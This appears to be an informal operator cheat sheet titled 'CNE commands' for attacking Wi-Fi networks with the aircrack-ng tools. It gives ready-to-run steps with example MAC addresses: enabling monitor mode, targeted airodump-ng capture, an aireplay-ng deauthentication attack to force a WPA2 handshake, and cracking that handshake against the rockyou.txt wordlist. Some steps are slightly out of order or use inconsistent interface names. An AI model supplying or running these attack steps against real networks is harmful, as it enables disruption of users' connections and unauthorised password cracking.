CNE commands

Revising these commands for ease of use -Q

!! Open a command shell
\/
ctrl + alt + t 
or just go to the top left and click on the icon

Go ahead and connect your wireless adapter (this is going to be your Alfa card or Trendnet and will be here on out called a wireless interface)

!! See interfaces
\/
ip addr
iwconfig

!!the wireless interface should pop up as wlan1 or wlan3 for kali
if in ubuntu it might pop up as wpldklsdfolighj or some shit like that

!! kill processes (this is not mandatory but is reccomended if your going to be doing static collect 
or youre just going to be collecting for a long time, this command is going to kill your network manager which 
is how you connect to wifi)
\/
sudo airmon-ng check kill

!! Start monitor mode (if running two wifi adapters youre going to need this command twice, once for each interface.
Keep in mind this is going top add "mon" to the end of you interface's name)
\/
sudo airmon-ng start <wireless interface>

EXAMPLE: sudo airmon-ng start wlan1

!! Verify that monitor mode is used
\/
sudo airmon-ng 

!! You could also use iwconfig to check that interface is in monitor mode:
\/
iwconfig

!! Get the AP's MAC address and channel (you can skip this if you're doing a broad survey)
\/
sudo airodump-ng <wireless interface>

EXAMPLE: sudo airodump-ng wlan1mon

!! Yes you can use both wifi adapters for different surveys, have one be for broad and you second be for a targetted.

!! Broad Survey 
( -w is to write a file, --band is for specifying 2.4g or 5g/both (airsuite does 2.4 by default)
--gpsd is for gps)
\/
sudo airodump-ng -w <filename> <wireless interface> --band abg --gpsd

EXAMPLE: sudo airodump-ng -w BroadSurvey wlan1mon --band abg --gpsd

!! Targetted Survey
(Make sure you replace the channel number and bssid with your own)
\/
sudo airodump-ng -w <filename> -c <channel> --bssid <mac of access point> <wireless interface>

EXAMPLE sudo airodump-ng -w TargettedSurvey -c 6 --bssid 90:9A:4A:B8:F3:FB wlan1mon

!!!!!ACTIVE BEYOND THIS POINT, ALL ATTACKS WILL BE USING A TARGETTED SURVEY!!!!!

!! create a 2nd terminal - deauth attack
(meant for WPA2)

!! Make sure you replace the bssid with your own
(the --deauth is the type of attack, the 1 is how many attacks youre using, -a is the BSSID of the access point)
\/
sudo aireplay-ng --deauth 1 -a <BSSID of AP> <wireless interface>

EXAMPLE: sudo aireplay-ng --deauth 1 -a 90:9A:4A:B8:F3:FB wlan0mon

!! Stop monitor mode
(puts interface back in managed mode)
\/
airmon-ng stop <wireless interface>

EXAMPLE: airmon-ng stop wlan1mon

!! in your first terminal you should see that it says it caught a handshake somewhere along the top right,
go ahead and ctrl + c that terminal to put it into a pcap

!! you should have a dictionary/ wordlist in the desktop, it will most likely be the rockyou.txt file 

!! view your pcap in the first terminal
(should end in a .pcap or .cap and it will be whatever you named)
\/
ls

!! crack the WPA2 encryption with the pcap and rockyou.txt
(the -w here refers to what wordlist you want to use)
\/
aircrack-ng <file you named>.pcap -w Desktop/rockyou.txt 

!! sit back and relax this might take awhile depending on the rockyou.txt file i downloaded.

!! the rest of this i'll fill in later when i refine my notes, for now contact a 17 for help, im still reserching and trouble shooting 
which way will be easiest to decrypt the trafic and what filters to have everyone use. -Q
